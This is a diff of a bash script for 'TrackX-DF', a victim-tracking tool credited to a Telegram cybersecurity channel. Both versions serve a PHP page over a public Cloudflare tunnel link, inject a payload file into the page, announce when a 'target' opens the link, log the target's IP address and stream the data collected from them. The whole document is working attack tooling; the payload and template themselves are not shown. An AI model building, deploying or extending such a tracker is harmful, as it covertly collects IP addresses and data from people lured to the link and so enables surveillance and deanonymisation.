@@ -1,6 +1,5 @@
 #!/bin/bash
-
-trap 'printf "\n"; stop' 2
+trap 'printf "\n";stop' 2
 
 red='\e[31m'
 green='\e[32m'
@@ -9,133 +8,111 @@ cyan='\e[36m'
 yellow='\e[33m'
 reset='\e[0m'
 
-# عرض البانر
-banner() {
-    clear
-    echo -e "${red}████████╗██████╗  █████╗  ██████╗██╗  ██╗${reset}"
-    echo -e "${red}╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝${reset}"
-    echo -e "${red}   ██║   ██████╔╝███████║██║     █████╔╝ ${reset}"
-    echo -e "${red}   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ${reset}"
-    echo -e "${red}   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗${reset}"
-    echo -e "${red}   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝${reset}"
-    echo -e "${cyan}-------------------------------------------${reset}"
-    echo -e "${yellow}        Tool: ${green}TrackX-DF${reset}"
-    echo -e "${yellow}        Developer: ${green}@A_Y_TR${reset}"
-    echo -e "${yellow}        Channel: ${green}https://t.me/cybersecurityTemDF${reset}"
-    echo -e "${yellow}        Version: ${green}v1.1${reset}"
-    echo -e "${cyan}-------------------------------------------${reset}"
-}
-
+clear
+echo -e "${red}████████╗██████╗  █████╗  ██████╗██╗  ██╗${reset}"
+echo -e "${red}╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝${reset}"
+echo -e "${red}   ██║   ██████╔╝███████║██║     █████╔╝ ${reset}"
+echo -e "${red}   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ${reset}"
+echo -e "${red}   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗${reset}"
+echo -e "${red}   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝${reset}"
+echo -e "${cyan}-------------------------------------------${reset}"
+echo -e "${yellow}        Tool: ${green}TrackXDF${reset}"
+echo -e "${yellow}        Developer: ${green}@A_Y_TR${reset}"
+echo -e "${yellow}        Channel: ${green}https://t.me/cybersecurityTemDF${reset}"
+echo -e "${yellow}        Version: ${green}v1.0${reset}"
+echo -e "${cyan}-------------------------------------------${reset}"
 
 dependencies() {
-    command -v php > /dev/null 2>&1 || { echo -e "${red}Error: PHP is not installed. Install it first.${reset}"; exit 1; }
-    command -v wget > /dev/null 2>&1 || { echo -e "${red}Error: wget is not installed. Install it first.${reset}"; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 }
-
 
 stop() {
-    for process in cloudflared php ssh; do
-        if pgrep -x "$process" > /dev/null; then
-            pkill -f -2 "$process"
-        fi
-    done
-    exit 1
+pkill -f -2 cloudflared > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+killall -2 ssh > /dev/null 2>&1
+exit 1
 }
-
 
 catch_ip() {
-    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-    if [[ ! -z "$ip" ]]; then
-        echo -e "${yellow}[+] Target IP: ${green}$ip${reset}"
-        cat ip.txt >> saved.ip.txt
-        rm -rf ip.txt
-    fi
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+cat ip.txt >> saved.ip.txt
 }
 
-# انتظار الضحية
 checkfound() {
-    echo -e "${cyan}[*] Waiting for target... (Press Ctrl + C to exit)${reset}"
-    while true; do
-        if [[ -e "ip.txt" ]]; then
-            echo -e "${green}[+] Target opened the link!${reset}"
-            catch_ip
-            tail -f -n 110 data.txt
-        fi
-        sleep 0.5
-    done
+printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets, Press Ctrl + C to exit...\e[0m\n"
+while true; do
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+tail -f -n 110 data.txt
+fi
+sleep 0.5
+done
 }
 
-# إعداد وتشغيل Cloudflared
 cf_server() {
-    if [[ ! -e cloudflared ]]; then
-        echo -e "${yellow}[+] Downloading Cloudflared...${reset}"
-        arch=$(uname -m)
-        case "$arch" in
-            *'arm'* | *'Android'* ) 
-                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
-                ;;
-            *'aarch64'* ) 
-                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-                ;;
-            *'x86_64'* ) 
-                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
-                ;;
-            * ) 
-                url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
-                ;;
-        esac
-        wget --no-check-certificate "$url" -O cloudflared > /dev/null 2>&1
-        chmod +x cloudflared
-    fi
-
-    echo -e "${yellow}[+] Starting PHP server...${reset}"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-    sleep 2
-
-    echo -e "${yellow}[+] Starting Cloudflared tunnel...${reset}"
-    rm -f cf.log
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
-    sleep 10
-
-    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cf.log)
-    if [[ -z "$link" ]]; then
-        echo -e "${red}[!] Failed to generate direct link.${reset}"
-        exit 1
-    else
-        echo -e "${green}[+] Direct link: ${blue}$link${reset}"
-    fi
-
-    sed "s+forwarding_link+$link+g" template.php > index.php
-    checkfound
+if [[ ! -e cloudflared ]]; then
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
+arch=$(uname -m)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
+elif [[ "$arch" == *'aarch64'* ]]; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
+elif [[ "$arch" == *'x86_64'* ]]; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
+else
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
+fi
+chmod +x cloudflared
+fi
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
+rm cf.log > /dev/null 2>&1 &
+./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
+sleep 10
+link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
+if [[ -z "$link" ]]; then
+printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
+exit 1
+else
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+fi
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+checkfound
 }
 
-# تشغيل السيرفر المحلي
 local_server() {
-    sed 's+forwarding_link+''+g' template.php > index.php
-    echo -e "${yellow}[+] Starting PHP server on localhost:8080...${reset}"
-    php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
-    sleep 2
-    checkfound
+sed 's+forwarding_link+''+g' template.php > index.php
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
+php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+sleep 2
+checkfound
 }
 
-# الوظيفة الرئيسية
 TrackXDF() {
-    rm -f data.txt ip.txt
-    touch data.txt
-    sed -e '/tc_payload/r payload' index.html > index.html
-
-    default_option_server="Y"
-    read -p $'\n\e[1;93m Do you want to use Cloudflared tunnel? (Y/N) [Default: Y]: \e[0m' option_server
-    option_server="${option_server:-${default_option_server}}"
-
-    if [[ $option_server =~ ^(Y|y|Yes|yes)$ ]]; then
-        cf_server
-    else
-        local_server
-    fi
+if [[ -e data.txt ]]; then
+cat data.txt >> targetreport.txt
+rm -rf data.txt
+touch data.txt
+fi
+rm -rf ip.txt
+sed -e '/tc_payload/r payload' index.html > index.html
+default_option_server="Y"
+read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+if [[ $option_server =~ ^[Yy]$ ]]; then
+cf_server
+else
+local_server
+fi
 }
 
-
-banner
 dependencies
 TrackXDF
